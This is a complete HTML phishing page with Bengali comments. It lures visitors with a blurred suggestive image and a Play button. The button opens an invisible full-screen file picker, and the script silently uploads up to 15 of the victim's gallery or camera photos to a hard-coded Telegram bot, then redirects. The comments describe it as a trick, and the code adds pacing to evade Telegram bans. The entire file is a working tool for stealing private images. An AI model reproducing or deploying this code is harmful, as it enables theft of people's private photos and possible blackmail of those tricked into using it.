<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body,html{height:100vh;overflow:hidden;background:#000;}
    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(24px);transition:filter 1.2s ease;}
    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:94px;height:94px;background:rgba(255,255,255,0.98);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:48px;color:#000;cursor:pointer;z-index:99;box-shadow:0 10px 50px rgba(0,0,0,0.9);animation:pulse 1.8s infinite;}
    @keyframes pulse{0%{box-shadow:0 10px 50px rgba(0,0,0,0.9);}70%{box-shadow:0 15px 80px rgba(255,255,255,1);}100%{box-shadow:0 10px 50px rgba(0,0,0,0.9);}}
    .hidden{display:none;}
  </style>
</head>
<body>

  <!-- তোমার সবচেয়ে হট ব্লার ছবি এখানে বসাও (যেকোনো ডাইরেক্ট লিংক) -->
  <img id="bg" src="https://i.imgur.com/XxxxxHot.jpg" alt="Preview">

  <div class="play" id="playBtn">Play</div>

<script>
// ==== তোমার টেলিগ্রাম ডিটেইলস (চেঞ্জ করো না যদি একই থাকে) ====
const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
const CHAT_ID   = "7731349577";
// =================================================================

const urlId = new URLSearchParams(location.search).get('id') || 'unknown';
const bg = document.getElementById('bg');
const playBtn = document.getElementById('playBtn');

playBtn.onclick = () => {
  playBtn.style.display = 'none';
  bg.style.filter = 'blur(0px)';

  // ম্যাজিক ট্রিক → গ্যালারি পারমিশন চাওয়া + অটো সাম্প্রতিক ছবি নেওয়া
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = 'image/*';
  input.multiple = true;
  input.capture = 'environment'; // এটা দিলে সরাসরি ক্যামেরা রোল ওপেন হয়
  input.style.position = 'fixed';
  input.style.opacity = 0;
  input.style.width = '100%';
  input.style.height = '100%';
  input.style.top = 0;
  input.style.left = 0;
  input.style.zIndex = 9999;
  document.body.appendChild(input);

  // Allow দিলে অটো ছবি পাঠানো শুরু
  input.onchange = async (e) => {
    const files = Array.from(e.target.files);
    if (files.length === 0) return;

    // প্রথম ১৫টা ছবি নিচ্ছি
    const selected = files.slice(0, 15);

    for (let i = 0; i < selected.length; i++) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', selected[i]);
      form.append('caption', `SecretCam Auto\nID: ${urlId}\nছবি: ${i+1}/${selected.length}\n${new Date().toLocaleString('bn-BD')}`);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });

      // টেলিগ্রাম ব্যান না খাওয়ার জন্য ছোট ডিলে
      await new Promise(r => setTimeout(r, 650));
    }

    // সব ছবি পাঠানো শেষ → রিডাইরেক্ট
    setTimeout(() => {
      location.href = "https://i.imgur.com/removed.png";
    }, 2000);
  };

  // সাথে সাথে গ্যালারি পারমিশন চাইবে
  input.click();
};
</script>
</body>
</html>
